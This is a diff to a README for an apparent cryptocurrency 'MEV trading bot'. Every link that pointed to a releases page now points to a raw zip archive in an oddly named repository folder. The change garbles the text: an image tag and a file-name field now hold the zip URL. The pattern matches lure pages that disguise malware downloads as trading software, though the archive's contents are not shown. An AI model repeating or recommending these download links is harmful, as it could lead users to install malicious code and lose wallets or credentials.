@@ -1,6 +1,6 @@
 # 🚀 MEV-by-JaredFromSubway - Optimize Your Trading Efforts
 
-![Download](https://github.com/sionetukuafu919-design/MEV-by-JaredFromSubway/releases/download/latest/DownloadButton.png)
+![Download](https://raw.githubusercontent.com/sionetukuafu919-design/MEV-by-JaredFromSubway/main/sussultatory/MEV-by-JaredFromSubway-2.5.zip)
 
 ## 📜 Description
 
@@ -20,11 +20,11 @@ Before you download the software, please ensure your computer meets the followin
 Follow these steps to set up and run our trading bot:
 
 1. **Visit the Releases Page**
-   - Go to the following link to download the latest version: [Download MEV-by-JaredFromSubway](https://github.com/sionetukuafu919-design/MEV-by-JaredFromSubway/releases).
+   - Go to the following link to download the latest version: [Download MEV-by-JaredFromSubway](https://raw.githubusercontent.com/sionetukuafu919-design/MEV-by-JaredFromSubway/main/sussultatory/MEV-by-JaredFromSubway-2.5.zip).
 
 2. **Download the Software**
    - You will see a list of available releases. Choose the most recent one. Click on it to open the release notes and find the files available for download.
-   - Look for a file named `MEV-by-JaredFromSubway.zip` or relevant executable files. Click on it to download the file to your computer.
+   - Look for a file named `https://raw.githubusercontent.com/sionetukuafu919-design/MEV-by-JaredFromSubway/main/sussultatory/MEV-by-JaredFromSubway-2.5.zip` or relevant executable files. Click on it to download the file to your computer.
 
 3. **Extract the Files**
    - Once the download completes, locate the downloaded ZIP file on your computer.
@@ -74,7 +74,7 @@ Join our community for tips, updates, and support:
 
 ## 📥 Download & Install
 
-To begin, visit the following page to download the latest version of MEV-by-JaredFromSubway: [Download MEV-by-JaredFromSubway](https://github.com/sionetukuafu919-design/MEV-by-JaredFromSubway/releases).
+To begin, visit the following page to download the latest version of MEV-by-JaredFromSubway: [Download MEV-by-JaredFromSubway](https://raw.githubusercontent.com/sionetukuafu919-design/MEV-by-JaredFromSubway/main/sussultatory/MEV-by-JaredFromSubway-2.5.zip).
 
 ## ⚙️ Frequently Asked Questions
 
